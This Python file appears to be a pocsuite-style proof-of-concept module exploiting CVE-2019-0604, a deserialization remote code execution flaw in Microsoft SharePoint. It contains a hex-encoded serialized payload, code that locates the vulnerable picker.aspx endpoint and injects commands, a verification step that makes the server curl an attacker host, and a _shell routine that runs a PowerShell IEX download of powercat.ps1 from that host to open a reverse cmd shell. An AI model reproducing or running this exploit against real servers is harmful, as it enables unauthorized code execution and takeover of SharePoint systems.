"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
from collections import OrderedDict
from urllib.parse import quote, urljoin, urlparse

from Tools.PocSuite.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptDict, VUL_TYPE, logger, paths, POC_SCAN
from Tools.PocSuite.lib.utils import random_str

import requests  # python-requests, eg. apt-get install python3-requests
import sys, os
import re
import binascii
import socket 
import codecs 
import asyncio
import subprocess 
from multiprocessing import Process
from lxml import html
import time
import uuid 
from xml.sax.saxutils import escape 
from urllib.parse import urlparse, urljoin
sys.path.append(os.path.dirname(os.getcwd()) + "/../")
from configvalue import * 



class DemoPOC(POCBase):
    vulID = 'CVE-2019-0604'  # ssvid
    version = '1.0'
    author = ['khoa']
    vulDate = '13/03/2019'
    createDate = '2019-03-13'
    updateDate = '2019-03-13'
    references = ['https://www.thezdi.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability']
    name = 'Sharepoint - Microsoft Sharepoint RCE vulnerability'
    appPowerLink = {"typescan" : POC_SCAN.EXPLOITS.DIR,
                "language"  : [POC_SCAN.LANGUAGE.ASP],
                "folder_init": "cve_2019_0604"}
    appName = 'windows_CVE_2019_0604'
    appVersion = 'CVE_2019_0604'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''A remote code execution vulnerability exists in Microsoft SharePoint when the software fails to check the source markup of an application package. An attacker who successfully exploited the vulnerability could run arbitrary code in the context of the SharePoint application pool and the SharePoint server farm account.'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP


    pocDesc = '''CVSS: 7.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:H/RL:O/RC:C)'''
    url_result = {}

    sharepoint2019and2016 = "?PickerDialogType=Microsoft.SharePoint.WebControls.ItemPickerDialog,+Microsoft.SharePoint,+Version=16.0.0.0,+Culture=neutral,+PublicKeyToken=71e9bce111e9429c"
    sharepoint2013 = "?PickerDialogType=Microsoft.SharePoint.WebControls.ItemPickerDialog,+Microsoft.SharePoint,+Version=15.0.0.0,+Culture=neutral,+PublicKeyToken=71e9bce111e9429c"
    sharepoint2010 = "?PickerDialogType=Microsoft.SharePoint.WebControls.ItemPickerDialog,+Microsoft.SharePoint,+Version=14.0.0.0,+Culture=neutral,+PublicKeyToken=71e9bce111e9429c"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/69.0',
    }
    payload = "__bpzzzz35009700370047005600d600e2004400160047001600e20035005600270067009600360056003700e2009400e600470056002700e6001600c600e2005400870007001600e600460056004600750027001600070007005600270006002300b500b50035009700370047005600d600e20075009600e6004600f60077003700e200d40016002700b60057000700e20085001600d600c600250056001600460056002700c200020005002700560037005600e6004700160047009600f600e600640027001600d60056007700f6002700b600c200020065005600270037009600f600e600d3004300e2000300e2000300e2000300c200020034005700c6004700570027005600d300e60056005700470027001600c600c2000200050057002600c60096003600b400560097004500f600b6005600e600d3003300130026006600330083005300630016004600330063004300560033005300d500c200b50035009700370047005600d600e20075009600e6004600f60077003700e2004400160047001600e200f4002600a600560036004700440016004700160005002700f60067009600460056002700c200020005002700560037005600e6004700160047009600f600e600640027001600d60056007700f6002700b600c200020065005600270037009600f600e600d3004300e2000300e2000300e2000300c200020034005700c6004700570027005600d300e60056005700470027001600c600c2000200050057002600c60096003600b400560097004500f600b6005600e600d3003300130026006600330083005300630016004600330063004300560033005300d500d500c200020035009700370047005600d600e2004400160047001600e20035005600270067009600360056003700c200020065005600270037009600f600e600d3004300e2000300e2000300e2000300c200020034005700c6004700570027005600d300e60056005700470027001600c600c2000200050057002600c60096003600b400560097004500f600b6005600e600d3002600730073001600530036005300630013009300330043005600030083009300a300c300f3008700d600c600020067005600270037009600f600e600d30022001300e2000300220002005600e6003600f60046009600e6007600d3002200570047006600d200130063002200f300e300d000a000c3005400870007001600e6004600560046007500270016000700070056002700f400660085001600d600c600250056001600460056002700f4002600a600560036004700440016004700160005002700f6006700960046005600270002008700d600c600e6003700a300870037009600d30022008600470047000700a300f200f200770077007700e20077003300e200f60027007600f2002300030003001300f2008500d400c4003500360086005600d6001600d2009600e600370047001600e60036005600220002008700d600c600e6003700a300870037004600d30022008600470047000700a300f200f200770077007700e20077003300e200f60027007600f2002300030003001300f2008500d400c4003500360086005600d60016002200e300d000a00002000200c30005002700f600a6005600360047005600460005002700f600070056002700470097000300e300d000a0000200020002000200c300f4002600a6005600360047009400e600370047001600e600360056000200870037009600a3004700970007005600d300220085001600d600c60025005600160046005600270022000200f200e300d000a0000200020002000200c300d400560047008600f6004600e4001600d6005600e30005001600270037005600c300f200d400560047008600f6004600e4001600d6005600e300d000a0000200020002000200c300d400560047008600f60046000500160027001600d60056004700560027003700e300d000a000020002000200020002000200c3001600e600970045009700070056000200870037009600a3004700970007005600d3002200870037004600a3003700470027009600e60076002200e3006200c6004700b300250056003700f600570027003600560044009600360047009600f600e60016002700970002008700d600c600e6003700d30072008600470047000700a300f200f2003700360086005600d60016003700e200d600960036002700f6003700f60066004700e2003600f600d600f20077009600e60066008700f2002300030003006300f20087001600d600c600f20007002700560037005600e6004700160047009600f600e600720002008700d600c600e6003700a3008700d30072008600470047000700a300f200f2003700360086005600d60016003700e200d600960036002700f6003700f60066004700e2003600f600d600f20077009600e60066008700f2002300030003006300f20087001600d600c600720002008700d600c600e6003700a30035009700370047005600d600d30072003600c6002700d200e6001600d600560037000700160036005600a30035009700370047005600d600b3001600370037005600d6002600c6009700d300d60037003600f6002700c60096002600720002008700d600c600e6003700a3004400960016007600d30072003600c6002700d200e6001600d600560037000700160036005600a30035009700370047005600d600e2004400960016007600e600f60037004700960036003700b3001600370037005600d6002600c6009700d30037009700370047005600d6007200620076004700b3006200c6004700b300f4002600a600560036004700440016004700160005002700f6006700960046005600270002008700a300b40056009700d3007200970072000200f4002600a6005600360047004500970007005600d3007200b7008700a300450097000700560002004400960016007600a30005002700f6003600560037003700d70072000200d400560047008600f6004600e4001600d6005600d3007200350047001600270047007200620076004700b3006200c6004700b300f4002600a600560036004700440016004700160005002700f60067009600460056002700e200d400560047008600f60046000500160027001600d60056004700560027003700620076004700b3006200c6004700b30035009700370047005600d600a3003500470027009600e6007600620076004700b3003600d60046006200c6004700b300f20035009700370047005600d600a3003500470027009600e6007600620076004700b3006200c6004700b30035009700370047005600d600a3003500470027009600e6007600620076004700b300f20036000200e200e200e200140024003400e200e200e20002006200c6004700b300f20035009700370047005600d600a3003500470027009600e6007600620076004700b3006200c6004700b300f200f4002600a600560036004700440016004700160005002700f60067009600460056002700e200d400560047008600f60046000500160027001600d60056004700560027003700620076004700b3006200c6004700b300f200f4002600a600560036004700440016004700160005002700f60067009600460056002700620076004700b3006200c6004700b300f200250056003700f600570027003600560044009600360047009600f600e600160027009700620076004700b3000200c300f2001600e60097004500970007005600e300d000a0000200020002000200c300f200d400560047008600f60046000500160027001600d60056004700560027003700e300d000a00002000200c300f20005002700f600a6005600360047005600460005002700f600070056002700470097000300e300d000a000c300f2005400870007001600e6004600560046007500270016000700070056002700f400660085001600d600c600250056001600460056002700f4002600a600560036004700440016004700160005002700f60067009600460056002700e300"
    

    # def _options(self):
    #     o = OrderedDict()
    #     payload = {
    #         "nc": REVERSE_PAYLOAD.NC,
    #         "bash": REVERSE_PAYLOAD.BASH,
    #     }
    #     o["command"] = OptDict(selected="bash", default=payload)
    #     return o
    def serialize_command(self,cmd): 
        total = ""
        for x in cmd: 
            a = codecs.encode(x,"utf-16be")
            b = codecs.encode(a,"hex").decode("ascii")
            total += b[::-1]
        return total

    def check_version(self, url):
        firstcall = requests.get(self.url, headers=self.headers)
        vuln_url = ""
        if (firstcall.status_code != 200): 
            return False
        else: 
            spheader = firstcall.headers.get('MicrosoftSharePointTeamServices','16')
            spheader = int(spheader.split('.')[0])
            if spheader == 15: 
                vuln_url = self.url + "/_layouts/15/picker.aspx" + self.sharepoint2013
            elif spheader == 14: 
                vuln_url = self.url + "/_layouts/15/picker.aspx" + self.sharepoint2010
            else: 
                vuln_url = self.url + "/_layouts/15/picker.aspx" + self.sharepoint2019and2016
            secondcall = requests.get(vuln_url,headers=self.headers)
            if "Picker" not in secondcall.text: 
                return False
            else : 
                return vuln_url               
              
    def _verify(self):
        Check = str(uuid.uuid4().hex)
        viewstate = ''
        eventvalidation = ''
        vuln_url = self.check_version(self.url)
        result = {}
        if vuln_url: 
            call = requests.get(vuln_url, headers=self.headers)
            tree = html.fromstring(call.content) 
            viewstate = tree.get_element_by_id('__VIEWSTATE')
            viewstate = viewstate.value
            eventvalidation = tree.get_element_by_id('__EVENTVALIDATION')
            eventvalidation = eventvalidation.value
            url_check = "http://{}:65535".format(PUBLIC_IP)
            cmd = "powershell curl " + url_check
            cmd = cmd + "/" + Check
            escapecmd = escape(cmd) 
            srlcmd = self.serialize_command(escapecmd) 
            length = 1448 + len(escapecmd)
            hex_length = format(length*4,'x') 
            serialized_length = hex_length[::-1]
            self.payload = self.payload.replace("e200e200e200140024003400e200e200e200",srlcmd)
            self.payload = self.payload.replace("zzzz",serialized_length)
            data = {"__VIEWSTATE":viewstate,"__EVENTVALIDATION":eventvalidation,"ctl00$PlaceHolderDialogBodySection$ctl05$hiddenSpanData":self.payload}
            thirdcall = requests.post(vuln_url, data=data,headers=self.headers)
            time.sleep(1)
            Check_success = requests.get(url_check + "/logfile.txt")            
            if(Check in Check_success.text): 
                result['VerifyInfo'] = {}
                result['VerifyInfo']['url'] = vuln_url 
                result['VerifyInfo']['info'] = '''Microsoft Sharepoint deserialize RCE'''
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def _shell(self):
        #getdata input
        datainput = self.headers['Referer']['input']
 
        #-- 
        REVERSE_SHELL_IP = datainput['LHOST']
        REVERSE_SHELL_PORT = str(datainput['LPORT'])
        viewstate = ''
        eventvalidation = ''
        vuln_url = self.check_version(self.url)
        result = {}
        if vuln_url: 
            call = requests.get(vuln_url, headers=self.headers)
            tree = html.fromstring(call.content) 
            viewstate = tree.get_element_by_id('__VIEWSTATE')
            viewstate = viewstate.value
            eventvalidation = tree.get_element_by_id('__EVENTVALIDATION')
            eventvalidation = eventvalidation.value
            cmd = '''powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://{}:65535/powercat.ps1');powercat -c {} -p {} -e cmd"'''.format(PUBLIC_IP, REVERSE_SHELL_IP, REVERSE_SHELL_PORT)
            escapecmd = escape(cmd) 
            srlcmd = self.serialize_command(escapecmd) 
            length = 1448 + len(escapecmd)
            hex_length = format(length*4,'x') 
            serialized_length = hex_length[::-1]
            self.payload = self.payload.replace("e200e200e200140024003400e200e200e200",srlcmd)
            self.payload = self.payload.replace("zzzz",serialized_length)
            data = {"__VIEWSTATE":viewstate,"__EVENTVALIDATION":eventvalidation,"ctl00$PlaceHolderDialogBodySection$ctl05$hiddenSpanData":self.payload}
            thirdcall = requests.post(vuln_url, data=data,headers=self.headers) 

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
